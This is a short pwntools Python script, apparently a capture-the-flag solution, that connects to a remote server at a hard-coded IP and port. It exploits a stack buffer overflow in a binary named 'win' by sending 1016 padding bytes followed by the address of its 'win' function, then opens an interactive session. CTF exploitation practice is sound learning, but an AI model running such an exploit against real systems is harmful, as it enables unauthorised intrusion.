from pwn import *

elf = context.binary = ELF('./win')
# io = elf.process()
io = remote("103.185.44.248", 1439)

payload = flat([
  cyclic(1016),
  elf.sym['win']
])

io.sendline(payload)
io.interactive()
